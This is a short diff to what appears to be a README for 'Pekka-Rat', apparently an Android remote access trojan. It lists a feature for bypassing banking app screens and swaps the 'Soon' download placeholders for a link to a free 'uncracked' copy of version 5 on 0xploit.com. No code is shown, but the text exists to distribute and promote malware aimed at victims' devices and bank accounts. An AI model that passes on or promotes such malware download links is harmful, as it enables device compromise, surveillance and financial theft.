@@ -115,10 +115,5 @@ Special Features
 - [x] Bypass Bank App Screen
 
 # Pekka-Rat Rat Download Links
-Shorten Link If You Want To Support Us:
 
-Soon
-
-Direct Download Link :
-
-Soon
+https://0xploit.com/posts/pekka-rat-v5-download-free-uncracked
